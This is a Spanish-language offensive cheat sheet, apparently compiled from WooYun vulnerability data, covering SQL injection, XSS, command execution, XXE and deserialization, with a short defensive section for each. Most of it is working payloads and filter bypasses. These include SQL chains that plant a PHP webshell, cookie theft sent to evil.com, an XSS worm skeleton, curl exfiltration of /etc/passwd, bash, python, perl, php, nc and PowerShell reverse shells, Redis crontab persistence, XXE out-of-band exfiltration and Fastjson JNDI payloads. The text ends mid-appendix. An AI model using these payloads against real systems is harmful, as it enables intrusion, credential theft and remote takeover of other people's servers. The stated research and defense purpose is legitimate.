# Seguridad de Inyección Web

> Refinado a partir de la base de conocimiento de tres grandes tipos de inyección de la base de vulnerabilidades WooYun: inyección SQL (27,732 casos), XSS (7,532 casos), ejecución de comandos (6,826 casos)
> Fuente de datos: wooyun_vulnerabilities.json (88,636 registros de vulnerabilidades, 2010-2016)
> Este documento es únicamente para investigación de seguridad y referencia defensiva

---

## Uno. Inyección SQL

### 1.1 Esencia de la vulnerabilidad

```
Falta de validación de entrada → concatenación dinámica de SQL → ruptura del límite semántico → ejecución de instrucciones de base de datos
```

**Fórmula central**: Inyección SQL = confusión del límite entre código y datos + entrada del usuario elevada a instrucción SQL ejecutable

### 1.2 Métodos de detección

#### Identificación de puntos de inyección de alto riesgo

| Tipo de vector | Proporción | Escenario típico |
|---------|------|---------|
| Formulario de login | 66% | concatenación directa de usuario/contraseña |
| Cuadro de búsqueda | 64% | coincidencia difusa con sentencia LIKE |
| Parámetros POST | 60% | envío de formulario |
| Encabezados HTTP | 26% | UA/Referer/XFF |
| Parámetros GET | 24% | parámetros de URL |
| Cookie | 12% | procesamiento de identificador de sesión |

**Nombres de parámetros de alta frecuencia**: `id`, `sort_id`, `username`, `password`, `type`, `action`, `page`, `name`; específicos de ASP.NET: `__viewstate`, `__eventvalidation`

#### Flujo rápido de detección

```
1. Prueba con comilla simple/doble → observar error
2. Operación matemática: id=2-1 / id=1*1 → observar equivalencia
3. Prueba booleana: and 1=1 / and 1=2 → comparar diferencia de respuesta
4. Retraso temporal: and sleep(5) → observar tiempo de respuesta
5. Sondeo de columnas por orden: order by N → incrementar hasta error
```

#### Identificación de huella digital de base de datos

| Base de datos | Función de retraso | Tabla del sistema | Característica de error |
|-------|---------|-------|---------|
| MySQL | `sleep(N)` / `benchmark()` | `information_schema.tables` | "You have an error in your SQL syntax" |
| MSSQL | `WAITFOR DELAY '0:0:N'` | `sysobjects` | "Unclosed quotation mark" |
| Oracle | `dbms_pipe.receive_message('a',N)` | `all_tables` | "ORA-00942" |
| Access | retraso por producto cartesiano | `MSysObjects` | "Microsoft JET Database Engine" |

### 1.3 Técnicas de inyección y Payload

#### Inyección ciega booleana

```sql
id=1 AND 1=1    -- Verdadero
id=1 AND 1=2    -- Falso
id=1' AND '1'='1
id=1 AND ASCII(SUBSTRING((SELECT database()),1,1))>100
-- MySQL RLIKE
id=8 RLIKE (SELECT (CASE WHEN (7706=7706) THEN 8 ELSE 0x28 END))
```

#### Inyección ciega temporal

```sql
-- MySQL (técnica práctica de retraso anidado)
id=(select(2)from(select(sleep(8)))v)
id=(SELECT (CASE WHEN (1=1) THEN SLEEP(5) ELSE 1 END))
-- MSSQL
id=1; WAITFOR DELAY '0:0:5'--
-- Oracle
id=1 AND dbms_pipe.receive_message('a',5)=1
```

#### Consulta UNION

```sql
id=1 ORDER BY N--              -- sondear número de columnas
id=-1 UNION SELECT 1,2,3,4,5--  -- determinar posición de reflejo
id=-1 UNION SELECT 1,database(),version(),user(),5--
id=-1 UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database()--
```

#### Inyección basada en errores

```sql
-- MySQL extractvalue/updatexml
id=1 AND extractvalue(1,concat(0x7e,(SELECT database()),0x7e))
id=1 AND updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)
-- MySQL floor
id=1 AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT database()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)
-- MSSQL CONVERT
id=1 AND 1=CONVERT(INT,(SELECT @@version))
-- función CHAR para evadir filtro de caracteres
' AND 4329=CONVERT(INT,(SELECT CHAR(113)+CHAR(113)+(SELECT CHAR(49))+CHAR(113))) AND 'a'='a
```

### 1.4 Técnicas de bypass de WAF/filtros

#### Comentario en línea (el más usado)

```sql
/*!50000union*//*!50000select*/1,2,3
/*!UNION*//*!SELECT*/1,2,3
-- ejemplo de bypass en DeDeCMS
/*!50000Union*/+/*!50000SeLect*/+1,2,3,concat(0x7C,userid,0x3a,pwd,0x7C),5,6,7,8,9+from+`#@__admin`#
```

#### Bypass por codificación

```sql
-- hexadecimal: 'admin' -> 0x61646d696e
SELECT * FROM users WHERE name=0x61646d696e
-- doble codificación URL: %252f -> / , %2527 -> '
-- Unicode: %u0027 -> '
```

#### Sustitución de mayúsculas/minúsculas + espacios en blanco

```sql
UnIoN SeLeCt                    -- confusión de mayúsculas/minúsculas
UNION/**/SELECT/**/1,2,3        -- comentario en lugar de espacio
UNION%09SELECT                  -- sustitución por tabulación
UNION%0ASELECT                  -- sustitución por salto de línea
```

#### Sustitución de funciones

```sql
SUBSTRING -> MID / SUBSTR / LEFT / RIGHT
CONCAT -> CONCAT_WS / ||
CHAR(65) -> carácter A
```

#### Sustitución por equivalencia lógica

```sql
AND 1=1 -> && 1=1 -> & 1
OR 1=1  -> || 1=1 -> | 1
id=1 -> id LIKE 1 / id BETWEEN 1 AND 1 / id IN(1) / id REGEXP '^1$'
-- bypass de comillas
'admin' -> CHAR(97,100,109,105,110) -> 0x61646d696e
```

#### Inyección de byte ancho (codificación GBK)

```
%bf%27 evade addslashes()   -- en GBK, el carácter multibyte "absorbe" la barra invertida
```

#### Bypass a nivel de HTTP

```
Contaminación de parámetros: id=1&id=2             -- confusión por parámetros duplicados
Transferencia fragmentada: Transfer-Encoding: chunked
Inyección vía X-Forwarded-For / inyección vía Cookie  -- puntos de inyección no convencionales
```

### 1.5 Cadenas de explotación

#### Cadena de explotación completa en MySQL

```sql
-- 1.información -> 2.base de datos -> 3.tabla -> 4.columna -> 5.datos -> 6.archivo -> 7.Shell
union select 1,database(),version(),user(),5--
union select 1,group_concat(schema_name),3 from information_schema.schemata--
union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()--
union select 1,group_concat(column_name),3 from information_schema.columns where table_name='users'--
union select 1,group_concat(username,0x3a,password),3 from users--
union select 1,load_file('/etc/passwd'),3--
union select 1,'<?php @system($_POST[cmd]);?>',3 into outfile '/var/www/html/shell.php'--
```

#### Cadena de explotación completa en MSSQL

```sql
union select 1,@@version,db_name(),system_user,5--
union select 1,name,3 from master..sysdatabases--
union select 1,name,3 from sysobjects where xtype='U'--
union select 1,username+':'+password,3 from users--
-- ejecución de comandos (requiere privilegios de sa)
EXEC sp_configure 'show advanced options',1;RECONFIGURE;
EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;
exec master..xp_cmdshell 'whoami'--
```

#### Cadena de explotación en Oracle

```sql
union select banner,null from v$version where rownum=1--
union select table_name,null from all_tables where rownum<=10--
union select username||':'||password,null from users--
```

#### Cadena de explotación de inyección ciega en Access

```sql
-- No hay information_schema, se debe obtener el código fuente o adivinar nombres de tabla
id=8 AND (SELECT TOP 1 LEN(username) FROM C_User) > 5
id=8 AND ASCII((SELECT TOP 1 MID(username,1,1) FROM C_User)) = 97
-- Para enumerar múltiples usuarios usar NOT IN
id=8 AND ASCII((SELECT TOP 1 MID(username,1,1) FROM C_User WHERE id NOT IN (SELECT TOP 1 id FROM C_User))) > 97
```

### 1.6 Medidas de defensa

```python
# Consultas parametrizadas (opción preferida)
cursor.execute("SELECT * FROM users WHERE id = %s", (user_id,))  # Python
```

```php
$stmt = $pdo->prepare("SELECT * FROM users WHERE id = ?");        // PHP PDO
```

```java
PreparedStatement ps = conn.prepareStatement("SELECT * FROM users WHERE id = ?"); // Java
```

- Consultas parametrizadas/sentencias precompiladas (preferido), procedimientos almacenados (alternativa)
- Validación de entrada por lista blanca + conversión forzada de tipo para parámetros numéricos
- Mínimo privilegio de base de datos + ocultamiento de mensajes de error + despliegue de WAF

---

## Dos. XSS (Cross-Site Scripting)

### 2.1 Esencia de la vulnerabilidad

```
Entrada del usuario (datos) -> salida sin codificar -> el navegador la interpreta como código -> ejecución de script
```

**Fórmula central**: XSS = ruptura del límite de confianza + confusión del contexto de salida (los datos cambian de semántica según estén en HTML/JS/CSS/URL)

### 2.2 Métodos de detección

#### Puntos de salida de alto riesgo

| Punto de salida | Condición de activación | Escenario típico |
|-------|---------|---------|
| Apodo/firma de usuario | Carga de página | Página personal, comentarios, lista de amigos |
| Reflejo del cuadro de búsqueda | Operación de búsqueda | Página de resultados de búsqueda |
| Comentarios/mensajes | Visualización de contenido | Foro, blog, reseña de producto |
| Nombre/descripción de archivo | Lista de archivos | Almacenamiento en la nube, álbum de fotos |
| Cuerpo/asunto de correo | Apertura de correo | Sistema de correo |
| Nota de pedido | Vista en backend | Backend de e-commerce, sistema de tickets |

**Puntos de salida ocultos** (fáciles de pasar por alto): encabezados HTTP (XFF/UA escritos en logs), envío WAP mostrado en PC, apodo de cliente renderizado en Web, borrador/lista de revisión

#### Determinación rápida de contexto

```
¿La salida está dentro de <script>? -> contexto JS (verificar tipo de comilla)
¿La salida está en un valor de atributo?    -> contexto de atributo (verificar tipo de atributo)
¿La salida está en el contenido de una etiqueta?  -> contexto HTML (verificar etiquetas especiales textarea/title)
¿La salida está en una URL?       -> contexto URL (verificar restricción de protocolo)
¿La salida está en CSS?       -> contexto CSS (verificar soporte de expression)
```

### 2.3 Payload por contexto

#### Contenido de etiqueta HTML

```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<iframe src="javascript:alert(1)">
```

#### Valor de atributo HTML

```html
" onclick=alert(1) "
" onfocus=alert(1) autofocus="
"><script>alert(1)</script><"
" onmouseover=alert(1) x="
```

#### Cadena de JavaScript

```javascript
';alert(1);//
'-alert(1)-'
\';alert(1);//
</script><script>alert(1)</script>
```

#### Contexto URL

```
javascript:alert(1)
data:text/html,<script>alert(1)</script>
data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
```

### 2.4 Técnicas de bypass de WAF/filtros

#### Bypass por codificación

```html
<!-- entidades HTML -->
&#60;script&#62;alert(1)&#60;/script&#62;
&#x3c;script&#x3e;alert(1)&#x3c;/script&#x3e;
<!-- Base64 + protocolo data -->
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
<!-- codificación CSS (IE) -->
xss:\65\78\70\72\65\73\73\69\6f\6e(alert(1))
```

#### Deformación de etiquetas/atributos

```html
<ScRiPt>alert(1)</sCrIpT>              <!-- confusión de mayúsculas/minúsculas -->
<script/src=//xss.com/x.js>            <!-- barra en lugar de espacio -->
<img src=x onerror=alert(1)>           <!-- sin comillas -->
<scrscriptipt>alert(1)</scrscriptipt>  <!-- bypass por doble escritura -->
<scr\x00ipt>alert(1)</script>          <!-- bypass con carácter nulo -->
```

#### Manejadores de eventos alternativos

```html
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<input onfocus=alert(1) autofocus>
<select autofocus onfocus=alert(1)>
<textarea autofocus onfocus=alert(1)>
<marquee onstart=alert(1)>
<video><source onerror=alert(1)>
<audio src=x onerror=alert(1)>
<details open ontoggle=alert(1)>
<body onload=alert(1)>
```

#### Bypass específico de WAF

```html
.<script src=http://localhost/1.js>.    <!-- Anbao (WAF chino "Anquanbao"): agregar puntos antes y después -->
<!--[if true]><img onerror=alert(1) src=--> <!-- interferencia con comentarios -->
```

#### Bypass de límite de longitud

```html
<script src=//xss.pw/j>                <!-- carga externa más corta -->
<!-- concatenación DOM -->
<script>var s=document.createElement('script');s.src='//x.com/x.js';document.body.appendChild(s)</script>
<!-- concatenación de cadenas para evadir palabras clave -->
<script>window['al'+'ert'](1)</script>
<!-- fromCharCode -->
<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>
```

#### Bypass de HTTPOnly

- Usar interfaz Flash para obtener información del usuario en lugar de la Cookie
- Convertir a modo CSRF: ejecutar directamente operaciones sensibles (cambiar contraseña, agregar administrador, leer token)

### 2.5 Cadenas de explotación

#### Robo de Cookie

```html
<script>new Image().src="https://evil.com/c?="+document.cookie</script>
<img src=x onerror="new Image().src='https://evil.com/c?='+document.cookie">
<script>fetch('https://evil.com/c?='+document.cookie)</script>
```

#### Fuentes y sumideros clave de XSS basado en DOM

**Fuentes peligrosas**: `location.hash`, `location.search`, `document.referrer`, `window.name`, `document.URL`

**Sumideros peligrosos**: `innerHTML`, `outerHTML`, `document.write()`, `eval()`, `setTimeout()`, `element.src/href`

#### Lógica central de un gusano XSS

```javascript
// 1. obtener la identidad del usuario actual (cookie/token)
// 2. construir contenido que incluye el propio payload
// 3. publicar/compartir automáticamente (AJAX POST)
// 4. condición de activación: se propaga con solo verlo/visitarlo
function worm(){
    jQuery.post("/api/post", {"content": "<payload autopropagante>"})
}
worm()
```

#### Patrones de explotación combinada

```
XSS + CSRF -> obtener Token para ejecutar operaciones administrativas
XSS + SQLi -> ataque ciego para obtener Cookie -> inyección en backend
XSS -> secuestro de cuenta -> escalada de privilegios -> propagación tipo gusano
XSS ciego (mensajes/tickets/comentarios) -> obtener Cookie de administrador del backend
```

### 2.6 Medidas de defensa

- **Codificación de salida** (fundamental): entidades HTML en contexto HTML, codificación JS en contexto JS, codificación URL en contexto URL
- Política CSP para restringir el origen de scripts
- HTTPOnly para proteger la Cookie
- Validación de entrada por lista blanca (evitar lista negra, siempre queda algo sin cubrir)
- **Errores comunes**: filtrar solo la etiqueta script, filtrar solo minúsculas, el filtrado en frontend puede evadirse interceptando la petición, el filtrado de una sola pasada puede evadirse con doble escritura

---

## Tres. Ejecución de comandos

### 3.1 Esencia de la vulnerabilidad

```
Entrada del usuario (datos) -> concatenación sin sanitizar -> entra en el contexto de ejecución de comandos del sistema/código -> ejecución de instrucción del SO
```

**Fórmula central**: Ejecución de comandos = contaminación del flujo de datos + contexto de ejecución (Shell/código/expresión)

### 3.2 Métodos de detección

#### Puntos de entrada de alta frecuencia

| Tipo de entrada | Proporción | Escenario típico |
|---------|------|---------|
| Operación de archivos | 68% | subida, lectura, descompresión |
| Funciones de comando del sistema | 62% | exec/system/shell_exec |
| Framework Struts2 | 50% | inyección de expresión OGNL |
| SSRF | 30% | paso de parámetro URL |
| Comando ping | 26% | función de diagnóstico de red |
| Procesamiento de imágenes | 24% | ImageMagick |
| Deserialización Java | 20% | WebLogic/JBoss |

#### Símbolos de concatenación de comandos

| Símbolo | Significado | Lógica de ejecución |
|------|------|---------|
| `;` | separador | ejecución secuencial, sin importar el resultado del comando anterior |
| `\|` | pipe | la salida anterior se usa como entrada posterior |
| `` ` `` / `$()` | sustitución de comando | ejecuta el comando interno y devuelve el resultado |
| `\|\|` | OR lógico | ejecuta el segundo solo si el primero falla |
| `&&` | AND lógico | ejecuta el segundo solo si el primero tiene éxito |
| `%0a` / `%0d%0a` | salto de línea | separador de salto de línea codificado en URL |

#### Detección sin reflejo

```bash
# exfiltración vía DNSLog
ping `whoami`.xxxxx.ceye.io
curl http://`whoami`.xxxxx.ceye.io

# exfiltración vía HTTP
curl https://evil.com/?d=`cat /etc/passwd | base64 | tr '\n' '-'`
curl -X POST -d "data=$(cat /etc/passwd)" https://evil.com/c

# retraso temporal
sleep 5
ping -c 5 127.0.0.1

# escritura de archivo en el directorio Web
echo "test" > /var/www/html/proof.txt
```

### 3.3 Técnicas de bypass

#### Bypass de espacios

```bash
cat${IFS}/etc/passwd          # ${IFS} separador de campo interno
cat$IFS$9/etc/passwd          # $9 es un parámetro posicional vacío
cat%09/etc/passwd             # carácter de tabulación
cat</etc/passwd               # símbolo de redirección
{cat,/etc/passwd}             # expansión de llaves
```

#### Bypass de palabras clave

```bash
# separación con comillas/barra invertida
c'a't /etc/passwd
c"a"t /etc/passwd
c\at /etc/passwd

# concatenación de variables
a=c;b=at;$a$b /etc/passwd

# comodines
/bin/ca* /etc/passwd
/bin/c?t /etc/passwd
/???/??t /etc/passwd
```

#### Alternativas al comando cat

```bash
tac  head  tail  more  less  nl  sort  uniq  od -c  xxd  base64  rev  paste
```

#### Bypass por codificación

```bash
# Base64
echo "Y2F0IC9ldGMvcGFzc3dk" | base64 -d | bash
bash -c "$(echo Y2F0IC9ldGMvcGFzc3dk | base64 -d)"

# Hex
echo -e "\x63\x61\x74\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64" | bash
$(printf "\x63\x61\x74\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64")
```

### 3.4 Cadenas de explotación y Payload

#### Payload de vulnerabilidades de framework/componentes

**ImageMagick (CVE-2016-3714)**:

```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://example.com/"|bash -i >& /dev/tcp/ATTACKER/8080 0>&1 &")'
pop graphic-context
```

**Struts2 S2-045**:

```
Content-Type: %{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('X-Test',123*123)}.multipart/form-data
```

**Ejecución de comandos genérica vía OGNL en Struts2**:

```
${(#_memberAccess["allowStaticMethodAccess"]=true,#a=@java.lang.Runtime@getRuntime().exec('whoami').getInputStream(),#b=new java.io.InputStreamReader(#a),#c=new java.io.BufferedReader(#b),#d=new char[50000],#c.read(#d),#out=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),#out.println(#d),#out.close())}
```

**Bypass del sandbox Groovy de ElasticSearch**:

```json
{"size":1,"script_fields":{"x":{"script":"java.lang.Math.class.forName(\"java.lang.Runtime\").getRuntime().exec(\"id\").getText()"}}}
```

**Escritura no autorizada en Redis de clave pública SSH/Crontab**:

```bash
redis-cli -h target
config set dir /root/.ssh && config set dbfilename authorized_keys
set x "\n\nssh-rsa AAAA...\n\n" && save
# o escribir crontab
config set dir /var/spool/cron && config set dbfilename root
set x "\n\n*/1 * * * * /bin/bash -i >& /dev/tcp/attacker/8080 0>&1\n\n" && save
```

#### Colección de reverse shells

```bash
# Bash
bash -i >& /dev/tcp/ATTACKER/PORT 0>&1

# Python
python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"]);'

# Perl
perl -e 'use Socket;$i="ATTACKER";$p=PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");'

# PHP
php -r '$sock=fsockopen("ATTACKER",PORT);exec("/bin/sh -i <&3 >&3 2>&3");'

# NC sin parámetro -e
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER PORT >/tmp/f

# PowerShell (Windows)
powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("ATTACKER",PORT);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object System.Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$s.Write(([text.encoding]::ASCII).GetBytes($r),0,$r.Length)}
```

#### Jerarquía de funciones peligrosas de PHP

| Nivel | Función | Capacidad |
|-----|------|-----|
| L1 nivel de código | `eval()`, `assert()(PHP5)`, `create_function()`, `preg_replace(/e)` | ejecución de código PHP |
| L2 nivel Shell | `system()`, `passthru()`, `shell_exec()`, comillas invertidas | comando del sistema con reflejo |
| L3 nivel de proceso | `exec()`, `popen()`, `proc_open()`, `pcntl_exec()` | ejecución de subproceso |
| L4 nivel callback | `call_user_func()`, `array_map()` | llamada indirecta a función |

#### Técnicas de bypass de WAF en PHP

```php
// concatenación de cadenas
$func = 'sys'.'tem'; $func('whoami');
// función variable
$a='sys';$b='tem';($a.$b)('whoami');
// ofuscación por codificación
base64_decode('c3lzdGVt')           // system
str_rot13('flfgrz')                 // system
chr(115).chr(121).chr(115).chr(116).chr(101).chr(109) // system
// manipulación de cadenas
strrev('metsys')('whoami');
implode('',array('s','y','s','t','e','m'))('whoami');
```

#### Bypass de disable_functions

| Método | Principio | Condición |
|-----|------|-----|
| LD_PRELOAD | secuestrar función de biblioteca del sistema, mail() activa la carga de un .so malicioso | poder subir .so + mail() disponible |
| Shellshock | inyección de variable de entorno en Bash<=4.3 | Bash antiguo |
| Apache Mod_CGI | configuración de .htaccess para ejecución CGI | Apache + AllowOverride |
| PHP-FPM/FastCGI | modificar configuración de PHP para ejecutar código | acceso al puerto FPM/SSRF |
| ImageMagick | ejecución de comando mediante función delegate | uso de IM para procesar imágenes |
| Windows COM | componente WScript.Shell | Windows + extensión COM |

**Explotación central de LD_PRELOAD**:

```php
// subir .so malicioso (secuestra la función geteuid, que internamente llama a system())
putenv("LD_PRELOAD=/tmp/exploit.so");
mail("a@a.com","test","test");  // mail() inicia el proceso sendmail -> carga el .so -> ejecuta el comando
```

### 3.5 Medidas de defensa

```php
// Mejor práctica: validación por lista blanca + escapeshellarg
if (filter_var($_GET['ip'], FILTER_VALIDATE_IP)) {
    system("ping " . escapeshellarg($_GET['ip']));
}
```

- Evitar llamar directamente a comandos del sistema, usar funciones integradas del lenguaje en su lugar
- Ejecución parametrizada (paso de argumentos como array), prohibir la concatenación de cadenas
- Escape con `escapeshellarg()` + `escapeshellcmd()`
- Validación de entrada por lista blanca + verificación de tipo
- `disable_functions` para deshabilitar funciones peligrosas (atención al riesgo de bypass)
- Ejecutar el servicio Web con privilegio mínimo + aislamiento con contenedor/chroot
- Actualizar oportunamente los componentes del framework (Struts2/WebLogic/ImageMagick, etc.)

---

## Cuatro. XXE (Inyección de Entidad Externa XML)

### 4.1 Esencia de la vulnerabilidad

```
Entrada XML -> el parser habilita DTD/entidades externas -> la referencia a la entidad se parsea y ejecuta -> lectura de archivos/SSRF/RCE
```

**Fórmula central**: XXE = el parser XML permite referencias a entidades externas + entrada XML controlable por el usuario

### 4.2 Métodos de detección

**Identificación de puntos de entrada de alto riesgo**

| Tipo de entrada | Característica de detección | Escenario típico |
|----------|----------|----------|
| Interfaz API | Content-Type contiene `text/xml` o `application/xml` | API RESTful, servicio Web SOAP |
| Subida de archivos | imagen SVG, DOCX/XLSX/PPTX (en esencia ZIP con XML) | subida de avatar, importación de documentos |
| Análisis de datos | importación de configuración XML, suscripción RSS/Atom | administración de backend, funciones de agregación |
| Interacción de protocolo | autenticación SAML, WebDAV, XMPP | login SSO, gestión de archivos |

**Flujo rápido de detección**

```
1. Identificar la interfaz de procesamiento XML → modificar Content-Type a application/xml y probar
2. Enviar una declaración DTD básica → observar si se parsea (diferencia en el error)
3. Intentar referencia a entidad externa → lectura de archivo conocido vía protocolo file
4. Cuando no hay reflejo → exfiltración OOB (retorno vía DNS/HTTP)
```

### 4.3 Payload clásicos

#### Lectura de archivos (con reflejo)

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>&xxe;</foo>
```

#### Sondeo de red interna vía SSRF

```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://internal:8080/">]>
<foo>&xxe;</foo>

<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
<foo>&xxe;</foo>
```

#### Inyección ciega - exfiltración de datos OOB

```xml
<!-- DTD externo (evil.dtd alojado en el servidor del atacante) -->
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd"> %xxe;]>

<!-- contenido de evil.dtd: -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?d=%file;'>">
%eval;
%exfil;
```

#### Reflejo mediante error

```xml
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % error "<!ENTITY &#x25; e SYSTEM 'file:///nonexistent/%file;'>">
  %error;
  %e;
]>
```

### 4.4 Técnicas de bypass

| Método de bypass | Técnica | Escenario aplicable |
|----------|------|----------|
| Bypass por codificación | XML codificado en UTF-16BE/LE, UTF-7 | WAF basado en coincidencia de patrones ASCII |
| Anidación de entidad de parámetro | `%entity;` en lugar de `&entity;` | cuando se filtra la entidad general `&` |
| XInclude | `<xi:include href="file:///etc/passwd"/>` | cuando no se puede controlar la declaración DOCTYPE |
| Embebido en SVG | entidad XXE embebida dentro de un archivo SVG | cuando solo se permite subir imágenes |
| Embebido en DOCX/XLSX | modificar `[Content_Types].xml` dentro del documento Office | función de subida de documentos |
| Envuelto en CDATA | usar sección CDATA para evadir restricción de caracteres especiales | lectura de archivos con caracteres especiales de XML |

### 4.5 Medidas de defensa

```java
// Java: deshabilitar DTD y entidades externas
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
```

- Deshabilitar el procesamiento de DTD y el parseo de entidades externas (preferido)
- Usar JSON en lugar de XML para el intercambio de datos
- Validación de entrada por lista blanca, actualizar la librería de parseo XML
- Reglas de WAF que bloqueen las palabras clave `<!DOCTYPE`/`<!ENTITY`/`SYSTEM`

---

## Cinco. Vulnerabilidades de deserialización

### 5.1 Esencia de la vulnerabilidad

```
Datos serializados (no confiables) -> función de deserialización -> la reconstrucción del objeto activa métodos mágicos/callbacks -> ejecución de lógica maliciosa
```

**Fórmula central**: RCE por deserialización = entrada serializada controlable + clase peligrosa presente en el classpath/ámbito + cadena de explotación alcanzable (Gadget Chain)

### 5.2 Deserialización en Java

**Marcadores de detección**

```
Flujo binario: AC ED 00 05 (cabecera hex)
Base64:   rO0AB (cabecera codificada)
Ubicaciones comunes: Cookie, ViewState, JMX, RMI, protocolo T3, cuerpo HTTP
```

**Referencia rápida de cadenas de explotación**

| Cadena de explotación | Librería dependiente | Método de activación | Herramienta |
|--------|--------|----------|------|
| Commons-Collections | commons-collections 3.x/4.x | InvokerTransformer | ysoserial |
| Spring | spring-core + spring-beans | MethodInvokeTypeProvider | ysoserial |
| Fastjson | fastjson < 1.2.68 | `@type` autoType | manual/herramienta especializada |
| Jackson | jackson-databind | deserialización polimórfica | ysoserial |
| Inyección JNDI | JDK < 8u191 | carga remota de clase vía LDAP/RMI | JNDIExploit/marshalsec |

**Payload clásico de Fastjson**

```json
{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://attacker.com:1389/Exploit","autoCommit":true}

// bypass de caché en 1.2.47
{"a":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://attacker/","autoCommit":true}}
```

**Cadena de herramientas**

```bash
# generar payload con ysoserial
java -jar ysoserial.jar CommonsCollections1 "whoami" | base64

# servicio de inyección JNDI
java -jar JNDIExploit.jar -i attacker_ip

# iniciar LDAP/RMI malicioso con marshalsec
java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer "http://attacker/#Exploit"
```

### 5.3 Deserialización en PHP

**Marcadores de detección**

```
Formato: O:4:"User":2:{s:4:"name";s:5:"admin";s:3:"age";i:25;}
Funciones clave: unserialize(), activación vía protocolo phar://
```

**Cadena de explotación de métodos mágicos**

| Método | Momento de activación | Forma de explotación |
|------|----------|----------|
| `__wakeup()` | al llamar a unserialize() | sobrescritura de propiedad → operación peligrosa |
| `__destruct()` | al destruir el objeto | eliminación/escritura de archivo/ejecución de comando |
| `__toString()` | cuando el objeto se usa como cadena | concatenación en función peligrosa |
| `__call()` | al llamar a un método inexistente | trampolín de llamada encadenada |

**Idea de construcción de una cadena POP**

```
1. Encontrar el punto de entrada: método en __wakeup()/__destruct() que llama a una propiedad $this->xxx
2. Trampolín: encadenar hacia otras clases mediante __toString()/__call()/__get()
3. Destino final: llegar a una función peligrosa como system()/eval()/file_put_contents()
4. Construcción: controlar los valores de las propiedades para que la cadena quede completamente conectada
```

**Deserialización vía Phar (sin necesidad de llamar a unserialize)**

```php
// las funciones de operación de archivos activan la deserialización de phar://
file_exists('phar://upload/evil.phar');
is_dir('phar://upload/evil.jpg');      // disfrazado con extensión de imagen
```

### 5.4 Deserialización en Python

**Funciones peligrosas**

```python
import pickle, yaml, marshal

# pickle - la más común
pickle.loads(data)      # deserializar
pickle.load(file)       # deserializar desde archivo

# yaml - requiere Loader
yaml.load(data)         # inseguro por defecto (versiones antiguas)
yaml.load(data, Loader=yaml.FullLoader)  # carga restringida

# marshal - a nivel de bytecode
marshal.loads(data)     # cargar objeto de código
```

**Payload de RCE con pickle**

```python
import pickle, os

class Exploit:
    def __reduce__(self):
        return (os.system, ('whoami',))

payload = pickle.dumps(Exploit())
# construcción manual equivalente:
# pickle.loads(b"cos\nsystem\n(S'whoami'\ntR.")
```

**Payload de RCE con yaml**

```yaml
!!python/object/apply:os.system ['whoami']
# o
!!python/object/new:subprocess.check_output [['whoami']]
```

### 5.5 Medidas de defensa

```java
// Java: filtro de lista blanca en ObjectInputStream
ObjectInputStream ois = new ObjectInputStream(input) {
    @Override protected Class<?> resolveClass(ObjectStreamClass desc) throws IOException, ClassNotFoundException {
        if (!allowedClasses.contains(desc.getName())) throw new InvalidClassException("Blocked: " + desc.getName());
        return super.resolveClass(desc);
    }
};
```

- **Java**: actualizar componentes (Fastjson/Jackson/Commons-Collections), deshabilitar autoType, usar filtro de deserialización por lista blanca
- **PHP**: evitar que unserialize() procese entrada del usuario, usar json_decode en su lugar, deshabilitar el protocolo phar://
- **Python**: usar `yaml.safe_load()` en lugar de `yaml.load()`, prohibir que pickle procese datos no confiables, usar JSON
- **General**: evitar transmitir datos en formatos de serialización nativos, unificar el uso de JSON; aplicar verificación de firma/HMAC en los puntos de entrada de deserialización

---

## Apéndice: Referencia rápida de SQLMap

```bash
# detección básica
sqlmap -u "http://t/p.php?id=1" --batch
# petición POST
sqlmap -u "http://t/login.php" --data="user=t&pass=t" --batch
# inyección vía Cookie/encabezado HTTP
